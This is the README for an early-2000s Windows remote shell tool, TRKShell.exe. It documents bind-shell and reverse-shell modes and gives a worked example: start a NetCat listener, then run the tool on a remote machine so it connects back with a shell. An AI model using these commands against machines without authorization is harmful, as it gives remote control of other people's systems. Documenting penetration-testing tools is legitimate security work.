
		 Win32ASM Remote Shell v0.1
		============================


Haxorcitos Win32ASM Remote Shell v0.1
Coded by Tarako@3wdesign.es
Homepage: http://www.3WDesign.es/security Copyright (c) 2003
	  http://www.croulder.com/haxorcitos


Tested on Windows 2000 SP3 y Windows XP


Usage:
----

* Listening Mode:

   TRKShell.exe -l <Port>   

   While connected type "exit" to close the current connection, but TRKShell.exe will
    continue listening, to close the connection and TRKShell.exe type "bye"


* Connection Mode
  
   TRKShell.exe -c <IP> <Port> 

   While connected type "exit" to close the current connection and TRKShell.exe type "bye"

   Example: 1) Start a NetCat on your Computer
               nc.exe -vv -L -p 64000

            2) Then on the remote computer run TRKShell.exe
               TRKShell.exe -c <YourIP> 64000

            3) Now you will have a shell on the NetCat ;)




Informacion de Contacto:
------------------------

Tarako@3wdesign.es		- Bugs
comercial@3wdesign.es		- Info about Security Audits for your Company.